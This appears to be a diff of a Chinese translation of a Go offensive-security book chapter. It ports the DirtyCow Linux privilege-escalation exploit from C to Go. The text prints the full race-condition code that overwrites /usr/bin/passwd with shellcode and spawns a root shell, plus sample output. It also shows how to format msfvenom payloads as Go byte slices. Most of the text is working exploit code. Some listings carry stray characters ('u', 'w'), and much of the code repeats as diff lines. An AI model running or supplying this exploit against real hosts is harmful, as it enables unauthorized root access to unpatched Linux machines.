 C和Go之间的翻译非常简单。C和Go这两个代码部分保持相同的编号，以演示Go如何实现与C代码各自行相似的功能。在这两种情况下，通过定义 `uintptr` 变量来跟踪映射的内存。在Go中，将变量名声明为 `mapp`，因为与C不同，`map` 在Go中是一个保留关键字。然后初始化一个变量，用于通知线程停止处理。Go约定不是像C语言那样使用整数，而是使用带有缓冲的布尔管道。将其长度明确定义为2，因为将有两个发出信号的并发函数。接下来，为SUID可执行文件定义一个字符串，并通过将Shellcode硬编码到切片片来封装全局变量。与C版本相比，Go代码中省略了一些全局变量，这意味着将在相应的代码块中根据需要定义它们。
 
 接下来看下 `madvise()` 和 `procselfmem()` 这两个使用竞争条件的主要函数。同样，我们将清单9-8中的C版本与清单9-9中的Go版本进行比较。
 
-```C
+```c
 void *madviseThread(void *arg)
 {
-	char *str;
-	str=(char*)arg;
-	int i,c=0;
-	for(i=0;i<1000000 && !stop;i++) {
-		c+=madvise(map,100,MADV_DONTNEED); 
+    char *str;
+    str=(char*)arg;
+    int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        c+=madvise(map,100,MADV_DONTNEED); 
     }
-	printf("thread stopped\n"); 
+    printf("thread stopped\n"); 
 }
 
 void *procselfmemThread(void *arg)
 {
-	char *str;
-	str=(char*)arg;
-	int f=open("/proc/self/mem",O_RDWR); int i,c=0;
-	for(i=0;i<1000000 && !stop;i++) {
-		lseek(f,map,SEEK_SET); 
+    char *str;
+    str=(char*)arg;
+    int f=open("/proc/self/mem",O_RDWR); int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        lseek(f,map,SEEK_SET); 
         c+=write(f, str, sc_len);
-	}
-	printf("thread stopped\n"); 
+    }
+    printf("thread stopped\n"); 
 }
 ```
 
 清单 9-8: C中的竞争条件函数
 
-```Go
+```go
 func madvise() {
-	for i := 0; i < 1000000; i++ {
-		select {
-			case <- signals:u
-			fmt.Println("madvise done")
+    for i := 0; i < 1000000; i++ {
+        select {
+            case <- signals:u
+            fmt.Println("madvise done")
             return
         default:
-			syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED)
+            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED)
         }
-	} 
+    } 
 }
 
 func procselfmem(payload []byte) {
-	f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0) 
+    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0) 
     if err != nil {
-		log.Fatal(err) 
+        log.Fatal(err) 
     }
     for i := 0; i < 1000000; i++ { 
         select {
             case <- signals:u fmt.Println("procselfmem done") return
-		default:
-			syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))w f.Write(payload) 
+        default:
+            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))w f.Write(payload) 
         } 
     }
 }
@@ -621,286 +613,285 @@ func procselfmem(payload []byte) {
 
 以下是这些函数的C和Go版本之间的主要区别：
 
-- Go版本使用管道来确定何时提前中断循环，而C函数使用一个整数值来指示发生线程竞争何时中断循环。
-- Go版本使用 `syscall` 包调用Linux系统。传递给该函数的参数包括要调用的系统函数及其必需的参数。可以通过搜索Linux文档来找到函数的名称，用途和参数。这就是我们能够调用本地Linux函数的方式。
+* Go版本使用管道来确定何时提前中断循环，而C函数使用一个整数值来指示发生线程竞争何时中断循环。
+* Go版本使用 `syscall` 包调用Linux系统。传递给该函数的参数包括要调用的系统函数及其必需的参数。可以通过搜索Linux文档来找到函数的名称，用途和参数。这就是我们能够调用本地Linux函数的方式。
 
 现在来回顾一下 `waitForWrite()` 函数，该函数监视SUID是否发生更改，以便执行shellcode。C版本如清单9-10所示，Go版本如清单9-11所示。
 
-```C
+```c
 void *waitForWrite(void *arg) {
     char buf[sc_len];
-	for(;;) {
-		FILE *fp = fopen(suid_binary, "rb");
-                         
+    for(;;) {
+        FILE *fp = fopen(suid_binary, "rb");
+
         fread(buf, sc_len, 1, fp);
 
         if(memcmp(buf, sc, sc_len) == 0) {
-			printf("%s is overwritten\n", suid_binary); break;
-		}
+            printf("%s is overwritten\n", suid_binary); break;
+        }
         fclose(fp);
-		sleep(1); 
+        sleep(1); 
     }
     stop = 1;
     printf("Popping root shell.\n");
-	printf("Don't forget to restore /tmp/bak\n");
-	system(suid_binary); 
+    printf("Don't forget to restore /tmp/bak\n");
+    system(suid_binary); 
 }
 ```
 
-清单 9-10: C 中的 *waitForWrite()* 函数
+清单 9-10: C 中的 _waitForWrite\(\)_ 函数
 
-```Go
+```go
 func waitForWrite() {
-	buf := make([]byte, len(sc))
-	for {
-		f, err := os.Open(SuidBinary) 
+    buf := make([]byte, len(sc))
+    for {
+        f, err := os.Open(SuidBinary) 
         if err != nil {
-			log.Fatal(err) 
+            log.Fatal(err) 
         }
-		if _, err := f.Read(buf); err != nil { 
+        if _, err := f.Read(buf); err != nil { 
             log.Fatal(err)
-		}
-		f.Close()
-		if bytes.Compare(buf, sc) == 0 {
-			fmt.Printf("%s is overwritten\n", SuidBinary)
-			break 
         }
-		time.Sleep(1*time.Second) 
+        f.Close()
+        if bytes.Compare(buf, sc) == 0 {
+            fmt.Printf("%s is overwritten\n", SuidBinary)
+            break 
+        }
+        time.Sleep(1*time.Second) 
     }
-	signals <- true 
+    signals <- true 
     signals <- true
-    
-	fmt.Println("Popping root shell") 
+
+    fmt.Println("Popping root shell") 
     fmt.Println("Don't forget to restore /tmp/bak\n")
-	
+
     attr := os.ProcAttr {
-		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
-	}
-	proc, err := os.StartProcess(SuidBinary, nil, &attr)
-    if err !=nil {
-		log.Fatal(err) 
+        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
     }
-	proc.Wait()
-	os.Exit(0) 
+    proc, err := os.StartProcess(SuidBinary, nil, &attr)
+    if err !=nil {
+        log.Fatal(err) 
+    }
+    proc.Wait()
+    os.Exit(0) 
 }
 ```
 
-清单 9-11: Go中的 *waitForWrite()* 函数
+清单 9-11: Go中的 _waitForWrite\(\)_ 函数
 
 在这两种情况下，代码都定义了一个无限循环，该循环监视SUID二进制文件的变动。C中使用 `memcmp()` shellcode是否已写入目标，而Go代码使用 `bytes.Compare()`。当shellcode出现时，就会知道该漏洞成功地覆盖了文件。然后跳出无限循环，向正在运行的线程发出信号，表示它们现在可以停止了。与竞争条件的代码一样，Go版本通过通道来实现这一点，而C版本使用一个整数。最后，执行的可能是函数中最好的部分：SUID目标文件现在包含了恶意代码。Go代码有点冗长，因为需要传入与stdin, stdout和stderr对应的属性：分别指向打开输入文件、输出文件和错误文件描述符的文件指针。
 
 现在看一下 `main()` 函数，它调用前面执行此漏洞所需的函数。清单9-12是C代码，清单9-13是Go代码。
 
-```C
+```c
 int main(int argc,char *argv[]) {
     char *backup;
-    
-	printf("DirtyCow root privilege escalation\n"); 
+
+    printf("DirtyCow root privilege escalation\n"); 
     printf("Backing up %s.. to /tmp/bak\n", suid_binary);
-    
-	asprintf(&backup, "cp %s /tmp/bak", suid_binary); 
+
+    asprintf(&backup, "cp %s /tmp/bak", suid_binary); 
     system(backup);
-    
-	f = open(suid_binary,O_RDONLY); 
+
+    f = open(suid_binary,O_RDONLY); 
     fstat(f,&st);
-    
-	printf("Size of binary: %d\n", st.st_size);
+
+    printf("Size of binary: %d\n", st.st_size);
 
     char payload[st.st_size]; 
     memset(payload, 0x90, st.st_size); 
     memcpy(payload, sc, sc_len+1);
 
     map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0); 
-    
+
     printf("Racing, this may take a while..\n");
-    
-	pthread_create(&pth1, NULL, &madviseThread, suid_binary); 
+
+    pthread_create(&pth1, NULL, &madviseThread, suid_binary); 
     pthread_create(&pth2, NULL, &procselfmemThread, payload); 
     pthread_create(&pth3, NULL, &waitForWrite, NULL);
-    
+
     pthread_join(pth3, NULL);
 
     return 0; 
 }
 ```
 
-清单 9-12: C中的 *main()* 函数
+清单 9-12: C中的 _main\(\)_ 函数
 
-```Go
+```go
 func main() {
-	fmt.Println("DirtyCow root privilege escalation") 
+    fmt.Println("DirtyCow root privilege escalation") 
     fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)
 
     backup := exec.Command("cp", SuidBinary, "/tmp/bak") 
     if err := backup.Run(); err != nil {
-		log.Fatal(err) 
+        log.Fatal(err) 
     }
 
     f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600) 
     if err != nil {
-		log.Fatal(err) 
+        log.Fatal(err) 
     }
-	st, err := f.Stat() 
+    st, err := f.Stat() 
     if err != nil {
-		log.Fatal(err) 
+        log.Fatal(err) 
     }
-    
-	fmt.Printf("Size of binary: %d\n", st.Size())
+
+    fmt.Printf("Size of binary: %d\n", st.Size())
 
     payload := make([]byte, st.Size()) 
     for i, _ := range payload {
-		payload[i] = 0x90 
+        payload[i] = 0x90 
     }
-	for i, v := range sc { 
+    for i, v := range sc { 
         payload[i] = v
-	}
+    }
 
     mapp, _, _ = syscall.Syscall6( 
         syscall.SYS_MMAP,
-		uintptr(0), 
+        uintptr(0), 
         uintptr(st.Size()), 
         uintptr(syscall.PROT_READ), 
         uintptr(syscall.MAP_PRIVATE), 
         f.Fd(),
-		0,
-	)
+        0,
+    )
 
     fmt.Println("Racing, this may take a while..\n") 
     go madvise()
     go procselfmem(payload)
     waitForWrite()
 }
-
 ```
 
-清单 9-13: Go中的 *main()* 函数
+清单 9-13: Go中的 _main\(\)_ 函数
 
- `main()` 函数首先备份目标可执行文件。由于最终要覆盖它，因此不想丢失原始版本；这样做可能会对系统造成不好的影响。虽然C可以通过调用 `system()` 将整个命令作为一个字符串传给它来运行操作系统命令，但是Go需要依赖于 `exec.Command()` 函数，该函数将命令作为单独的参数传递。接下来，以只读模式打开SUID目标文件，检索文件统计信息，然后使用它们来初始化与目标文件大小相同的有效负载切片。在C语言中，通过调用 `memset()`，使用NOP (0x90)指令填充数组，然后通过调用`memcpy()`，使用shellcode复制数组的一部分。Go中则没有这样便利的函数。
+`main()` 函数首先备份目标可执行文件。由于最终要覆盖它，因此不想丢失原始版本；这样做可能会对系统造成不好的影响。虽然C可以通过调用 `system()` 将整个命令作为一个字符串传给它来运行操作系统命令，但是Go需要依赖于 `exec.Command()` 函数，该函数将命令作为单独的参数传递。接下来，以只读模式打开SUID目标文件，检索文件统计信息，然后使用它们来初始化与目标文件大小相同的有效负载切片。在C语言中，通过调用 `memset()`，使用NOP \(0x90\)指令填充数组，然后通过调用`memcpy()`，使用shellcode复制数组的一部分。Go中则没有这样便利的函数。
 
 相反，在Go中，循环遍历切片元素，并每次手动填充一个字节。之后，将对 `mapp()` 函数发出Linux系统调用，该函数会将目标SUID文件的内容映射到内存。对于以前的系统调用，可以通过搜索Linux文档来找到 `mapp()` 所需的参数。可能会注意到，Go代码调用`syscall.Syscall6()` 而不是调用 `syscall.Syscall()` 。`Syscall6()` 需要六个参数的系统调用，与 `mapp()` 一样。最后，代码启动了两个协程，并发地调用 `madvise()` 和 `procselfmem()` 函数。当竞争条件出现时，调用 `waitForWrite()` 函数，该函数监控SUID文件的改动，向线程发出停止的信号并执行恶意代码。
 
 为了完整起见，清单9-14是移植的Go代码的全部内容。
 
-```Go
+```go
 var mapp uintptr
 var signals = make(chan bool, 2) 
 const SuidBinary = "/usr/bin/passwd"
 
 var sc = []byte{
-	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
     --snip--
-	0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
+    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
 }
 
 func madvise() {
-	for i := 0; i < 1000000; i++ {
-		select {
-			case <- signals:
-			fmt.Println("madvise done")
+    for i := 0; i < 1000000; i++ {
+        select {
+            case <- signals:
+            fmt.Println("madvise done")
             return
         default:
-			syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED) }
-	} 
+            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED) }
+    } 
 }
 
 func procselfmem(payload []byte) {
-	f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0) 
-    if err != nil {
-		log.Fatal(err) 
-    }
-	for i := 0; i < 1000000; i++ { 
-        select {
-		case <- signals: 
-            fmt.Println("procselfmem done") 
-            return
-		default:
-			syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))
-            f.Write(payload) 
-        }
-	} 
-}
-
-func waitForWrite() {
-	buf := make([]byte, len(sc)) 
-    for {
-		f, err := os.Open(SuidBinary) 
-        if err != nil {
-			log.Fatal(err) 
-        }
-		if _, err := f.Read(buf); err != nil { 
-            log.Fatal(err)
-		}
-		f.Close()
-		if bytes.Compare(buf, sc) == 0 {
-			fmt.Printf("%s is overwritten\n", SuidBinary)
-			break 
-        }
-		time.Sleep(1*time.Second) 
-    }
-	signals <- true 
-    signals <- true
-    
-	fmt.Println("Popping root shell") 
-    fmt.Println("Don't forget to restore /tmp/bak\n")
-	attr := os.ProcAttr {
-		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
-	}
-	proc, err := os.StartProcess(SuidBinary, nil, &attr) 
-    if err !=nil {
-		log.Fatal(err) 
-    }
-	proc.Wait()
-	os.Exit(0) 
-}
-
-func main() {
-	fmt.Println("DirtyCow root privilege escalation") 
-    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)
-	backup := exec.Command("cp", SuidBinary, "/tmp/bak") 
-    if err := backup.Run(); err != nil {
-		log.Fatal(err) 
-    }
-	f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600) 
-    if err != nil {
-		log.Fatal(err) 
-    }
-	st, err := f.Stat() 
+    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0) 
     if err != nil {
         log.Fatal(err) 
     }
-	
+    for i := 0; i < 1000000; i++ { 
+        select {
+        case <- signals: 
+            fmt.Println("procselfmem done") 
+            return
+        default:
+            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))
+            f.Write(payload) 
+        }
+    } 
+}
+
+func waitForWrite() {
+    buf := make([]byte, len(sc)) 
+    for {
+        f, err := os.Open(SuidBinary) 
+        if err != nil {
+            log.Fatal(err) 
+        }
+        if _, err := f.Read(buf); err != nil { 
+            log.Fatal(err)
+        }
+        f.Close()
+        if bytes.Compare(buf, sc) == 0 {
+            fmt.Printf("%s is overwritten\n", SuidBinary)
+            break 
+        }
+        time.Sleep(1*time.Second) 
+    }
+    signals <- true 
+    signals <- true
+
+    fmt.Println("Popping root shell") 
+    fmt.Println("Don't forget to restore /tmp/bak\n")
+    attr := os.ProcAttr {
+        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
+    }
+    proc, err := os.StartProcess(SuidBinary, nil, &attr) 
+    if err !=nil {
+        log.Fatal(err) 
+    }
+    proc.Wait()
+    os.Exit(0) 
+}
+
+func main() {
+    fmt.Println("DirtyCow root privilege escalation") 
+    fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)
+    backup := exec.Command("cp", SuidBinary, "/tmp/bak") 
+    if err := backup.Run(); err != nil {
+        log.Fatal(err) 
+    }
+    f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600) 
+    if err != nil {
+        log.Fatal(err) 
+    }
+    st, err := f.Stat() 
+    if err != nil {
+        log.Fatal(err) 
+    }
+
     fmt.Printf("Size of binary: %d\n", st.Size())
 
     payload := make([]byte, st.Size()) 
     for i, _ := range payload {
-		payload[i] = 0x90 
+        payload[i] = 0x90 
     }
-	for i, v := range sc { 
+    for i, v := range sc { 
         payload[i] = v
-	}
-    
-	mapp, _, _ = syscall.Syscall6( 
+    }
+
+    mapp, _, _ = syscall.Syscall6( 
         syscall.SYS_MMAP,
-		uintptr(0), 
+        uintptr(0), 
         uintptr(st.Size()), 
         uintptr(syscall.PROT_READ), 
         uintptr(syscall.MAP_PRIVATE), 
         f.Fd(),
         0, 
     )
-    
-	fmt.Println("Racing, this may take a while..\n") 
+
+    fmt.Println("Racing, this may take a while..\n") 
     go madvise()
-	go procselfmem(payload)
-	waitForWrite()
+    go procselfmem(payload)
+    waitForWrite()
 }
 ```
 
-清单 9-14: 完整的 Go 代码 (/ch-9/dirtycow/main.go/)
+清单 9-14: 完整的 Go 代码 \(/ch-9/dirtycow/main.go/\)
 
 要确认代码是否能正常运行，请在易受攻击的主机上运行。没有比看到root shell更令人满意的了。
 
-```shell
+```text
 alice@ubuntu:~$ go run main.go
 DirtyCow root privilege escalation Backing up /usr/bin/passwd.. to /tmp/bak Size of binary: 47032
 Racing, this may take a while..
@@ -928,7 +919,7 @@ Metasploit框架是一个流行的开发和后开发工具包，它附带了 `ms
 
 如果指定了C转换类型，`msfvenom`将直接以C代码中的格式生成有效负载。这似乎是逻辑上的首选，因为在本章前面我们详细介绍了C和Go之间的许多相似之处。但是，它并不是我们Go代码的最佳选则。为了说明原因，请查看以下C格式的示例输出：
 
-```C
+```c
 unsigned char buf[] = 
 "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
 "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" 
@@ -940,7 +931,7 @@ unsigned char buf[] =
 
 清理有效负载后，将把有效负载作为字符串。要创建字节切片，需要输入以下内容：
 
-```Go
+```go
 payload := []byte("\xfc\xe8\x82...").
 ```
 
@@ -950,13 +941,13 @@ payload := []byte("\xfc\xe8\x82...").
 
 在改进之前的尝试后，来看一个 `hex` 转换。使用这种格式，`msfvenom` 会生成一个长的十六进制字符串：
 
-```C
+```c
 fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ff...6400
 ```
 
 如果这种格式看起来很熟悉，因为在移植Java反序列化漏洞时使用过。把该值作为字符串传递到对 `hex.DecodeString()` 的调用中。如果存在，它将返回一个字节切片和错误详情。可以这样使用它：
 
-```Go
+```go
 payload, err := hex.DecodeString("fce8820000006089e531c0648b50308b520c8b52148b 72280fb74a2631ff...6400")
 ```
 
@@ -966,22 +957,21 @@ payload, err := hex.DecodeString("fce8820000006089e531c0648b50308b520c8b52148b 7
 
 `num` 转换以十六进制的数字格式生成一个以逗号分隔的字节列表：
 
-```
+```text
 0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 
 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 
 --snip--
 0x64, 0x00
-
 ```
 
 可以直接用来初始化字节切片，如下所示：
 
-```Go
+```go
 payload := []byte{
-	0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 
+    0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 
     0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 
     --snip--
-	0x64, 0x00,
+    0x64, 0x00,
 }
 ```
 
@@ -991,7 +981,7 @@ payload := []byte{
 
 `raw` 转换会以原始二进制格式生成有效负载。如果数据本身显示在终端窗口上，则可能会产生乱码，如下所示：
 
-```sh
+```bash
 ���`��1�d�P0�R
 �8�u�}�;}$u�X�X$�f�Y ӋI�:I�4��1����
 ```
@@ -1000,7 +990,7 @@ payload := []byte{
 
 使用Linux中的 `xxd` 程序和 `-i` 命令行开关，可以轻松地将原始二进制数据转换为上一节的 `num` 格式。一个简单的 `msfvenom` 命令示例如下所示，可以将 `msfvenom` 生成的原始二进制输出通过管道传递到 `xxd` 命令中：
 
-```shell
+```text
 $ msfvenom -p [payload] [options] –f raw | xxd -i
 ```
 
@@ -1012,19 +1002,19 @@ $ msfvenom -p [payload] [options] –f raw | xxd -i
 
 生成二进制数据的Base64编码表示形式的最简单方法是在Linux中使用 `base64` 程序。可以通过标准输入或文件来编码或解码数据。可以使用 `msfvenom` 生成原始二进制数据，然后使用以下命令对结果进行编码：
 
-```shell
+```text
 $ msfvenom -p [payload] [options] –f raw | base64
 ```
 
 与C输出非常相似，生成的有效负载包含换行符，作为字符串用在代码中时，必须先对其进行处理。可以在Linux中使用 `tr` 工具删除所有换行符：
 
-```shell
+```text
 $ msfvenom -p [payload] [options] –f raw | base64 | tr –d "\n"
 ```
 
 编码后有效负载现在以连续字符串的形式存在。然后，在Go代码中，可以通过解码字符串将原始有效负载作为字节切片获取。使用`encoding/base64` 包来完成：
 
-```Go
+```go
 payload, err := base64.StdEncoding.DecodeString("/OiCAAAAYInlMcBki1Awi...WFuZAA=")
 ```
 
@@ -1036,6 +1026,7 @@ payload, err := base64.StdEncoding.DecodeString("/OiCAAAAYInlMcBki1Awi...WFuZAA=
 
 ### 总结
 
-尽管缺乏汇编可用性，但Go的标准包里提供了大量利于挖洞的功能。本章介绍了混淆、移植漏洞和处理二进制数据，还有shellcode。作为额外的学习，我们建议您访问https://www.exploit-db.com/来探索漏洞数据库，并尝试将现有的漏洞移植到Go中。这个任务繁重基于对源语言的熟练程度，但可以成为理解数据操作、网络通信和底层系统交互的绝佳机会。
+尽管缺乏汇编可用性，但Go的标准包里提供了大量利于挖洞的功能。本章介绍了混淆、移植漏洞和处理二进制数据，还有shellcode。作为额外的学习，我们建议您访问[https://www.exploit-db.com/来探索漏洞数据库，并尝试将现有的漏洞移植到Go中。这个任务繁重基于对源语言的熟练程度，但可以成为理解数据操作、网络通信和底层系统交互的绝佳机会。](https://www.exploit-db.com/来探索漏洞数据库，并尝试将现有的漏洞移植到Go中。这个任务繁重基于对源语言的熟练程度，但可以成为理解数据操作、网络通信和底层系统交互的绝佳机会。)
 
 在下一章中，我们的重点不在开发上，而专注于生成可扩展的工具集。
+
